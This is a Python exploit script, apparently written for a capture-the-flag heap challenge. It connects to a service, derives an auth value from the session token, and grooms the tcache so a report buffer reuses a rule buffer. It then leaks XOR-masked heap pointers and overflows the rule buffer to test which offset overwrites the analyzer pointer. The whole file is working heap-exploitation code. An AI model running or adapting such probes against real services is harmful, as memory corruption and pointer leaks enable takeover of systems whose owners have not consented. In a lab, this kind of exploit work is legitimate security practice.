import socket, struct, sys, re, time
sys.path.insert(0, __file__.rsplit("\\",1)[0])
import client

HOST, PORT = sys.argv[1], int(sys.argv[2])
offset = int(sys.argv[3])

def main():
    global client
    s = socket.create_connection((HOST, PORT))
    banner = client.rd(s, 1.5)
    m = re.search(rb"session token: ([0-9a-f]{8})", banner)
    client.TOKEN = int(m.group(1), 16)
    tok = client.TOKEN
    tok12 = (tok & 0xffffffff) << 12
    C = 0x5a5a5a5a41414141

    def pkt(ptype, payload, t=1.2):
        client.send_packet(s, ptype, payload)
        return client.rd(s, t)

    # auth
    pkt(2, struct.pack("<I", (tok ^ 0xc0ffee00) & 0xffffffff))
    # rule slot rlen=1 -> malloc(8); payload len = 3
    rule_payload = struct.pack("<H", 1) + b"A"
    pkt(3, rule_payload)
    # report create with SAME payload length (3) so per-packet buf reuses rule buf tcache chunk
    pkt(4, b"\x00\x00\x00")
    # leak R and D
    r = pkt(4, b"R")
    mm = re.search(rb"report cookie: 0x([0-9a-f]+)", r)
    report = None
    if mm:
        report = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff
    r = pkt(4, b"D")
    mm = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", r)
    D1 = int(mm.group(1),16) if mm else None
    fp1 = (D1 ^ C ^ tok12) & 0xffffffffffffffff if D1 else None

    # overflow rule: place marker at 'offset'
    MARK = 0x1122334455667788
    rlen = offset + 8
    if rlen > 0x80:
        print(f"offset {offset}: rlen {rlen} >0x80 skip")
        s.close(); return
    ov = bytearray(rlen)
    struct.pack_into("<Q", ov, offset, MARK)
    payload = struct.pack("<H", rlen) + bytes(ov)
    upd = pkt(3, payload)   # update rule (overflow)
    print(f"  [overflow rsp] {upd!r}")

    # leak D again
    r = pkt(4, b"D")
    mm = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", r)
    D2 = int(mm.group(1),16) if mm else None
    fp2 = (D2 ^ C ^ tok12) & 0xffffffffffffffff if D2 else None
    hit = (fp2 == MARK)
    s.close()
    print(f"offset={hex(offset)} report={hex(report) if report else None} fp1={hex(fp1) if fp1 else None} fp2={hex(fp2) if fp2 else None} HIT={hit}")

if __name__ == "__main__":
    main()
